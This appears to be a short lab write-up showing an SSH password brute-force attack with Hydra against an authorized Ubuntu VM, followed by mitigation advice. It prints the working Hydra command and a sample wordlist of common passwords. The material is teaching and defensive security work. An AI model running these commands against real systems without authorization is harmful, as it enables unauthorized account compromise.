# Hydra Password Attack Lab

## Objective

Demonstrate a password attack against an authorized SSH service using Hydra to identify weak credentials.

---

## Lab Environment

- Attacker: Kali Linux
- Target: Ubuntu Linux VM
- Tool: Hydra
- Protocol: SSH

---

## Tools Used

- Hydra
- OpenSSH Server
- Kali Linux

---

## Procedure

### 1. Verify SSH Connectivity

```bash
ssh username@TARGET_IP
```

### 2. Create Password Wordlist

```bash
nano pass.txt
```

Example:

```
123456
password
admin
letmein
talha123
```

### 3. Execute Hydra

```bash
hydra -l username -P pass.txt ssh://TARGET_IP
```

### 4. Successful Authentication

Hydra identified the valid SSH credentials after testing the supplied password list.

---

## Result

- SSH service accepted valid credentials.
- Weak passwords can be discovered through brute-force attacks.
- Strong password policies and account lockout mechanisms are recommended.

---

## Mitigation

- Use strong passwords.
- Enable MFA.
- Configure account lockout.
- Disable password authentication where possible.
- Monitor authentication logs.

---

## Disclaimer

This lab was performed in a controlled environment on systems owned or authorized for security testing.